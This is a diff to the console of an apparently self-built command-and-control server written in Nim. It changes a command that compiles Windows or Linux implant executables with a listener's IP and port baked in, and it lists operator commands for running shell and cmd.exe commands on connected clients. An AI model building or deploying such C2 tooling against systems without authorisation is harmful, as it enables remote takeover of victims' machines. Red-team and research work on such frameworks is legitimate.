@@ -1,5 +1,5 @@
 import asyncdispatch, asyncnet, threadpool, asyncfutures
-import strutils, terminal, osproc, sequtils
+import strutils, terminal, osproc
 
 import listeners/[tcp]
 import communication
@@ -37,32 +37,39 @@ proc procStdin*(server: C2Server) {.async.} =
             echo "-- Managing clients"
             echo "\tclients\tview a list of clients"
             echo "\tinfo\tget info about a client"
-            echo "\tshell\trun a shell command"
-            echo "\tcmd\trun a cmd command ('cmd.exe /c')"
+            echo "\tshell [cmd]\trun a shell command"
+            echo "\tcmd [cmd]\trun a cmd command ('cmd.exe /c')"
             echo "\tmsgbox\tsend a message box"
         
         # implants
 
         of "generateimplant":
-            let a_args_split = a_args.toLower().split(":")
-            let listenerType = a_args_split[0]
-            let listenerId = parseInt(a_args_split[1])
-            if listenerType == "tcp":
-
-                if len(server.tcpListeners) > listenerId:
-                    let tcpListener = server.tcpListeners[listenerId]
-                    infoLog "generating implant for " & $tcpListener
-                    let ip = tcpListener.listeningIP
-                    let port = tcpListener.port
-                    let exitCode = execCmd("nim c -d:client -d:ip=" & ip & " -d:port=" & $port & " -o:implant.exe .\\src\\client\\client.nim")
-                    # echo outp
-                    if exitCode != 0:
-                        errorLog "failed to build implant for " & $tcpListener
+            if argsn >= 3:
+                let args_split = args[1].split(":")
+                let listenerType = args_split[0]
+                let listenerId = parseInt(args_split[1])
+                let platform = args[2]
+                if listenerType == "tcp":
+                    if len(server.tcpListeners) > listenerId:
+                        let tcpListener = server.tcpListeners[listenerId]
+                        infoLog "generating implant for " & $tcpListener
+                        let ip = tcpListener.listeningIP
+                        let port = tcpListener.port
+                        let exitCode = execCmd(
+                            "nim c -d:client " &
+                                "-d:ip=" & ip & " " & 
+                                "-d:port=" & $port & " " & 
+                                (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
+                                "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
+                                ".\\src\\client\\client.nim")
+                        if exitCode != 0:
+                            errorLog "failed to build implant for " & $tcpListener
+                        else:
+                            infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ")
                     else:
-                        infoLog "saved implant to implant.exe"
-                else:
-                    errorLog "there are no tcp listeners with id " & $listenerId 
-
+                        errorLog "there are no tcp listeners with id " & $listenerId 
+            else:
+                errorLog "incorrect usage. correct usage: generateimplant [listener identifier] [platform]. examples:\n\tgenerateimplant tcp:0 windows\n\tgenerateimplant tcp:0 linux"
         # listener management
 
         of "listeners":
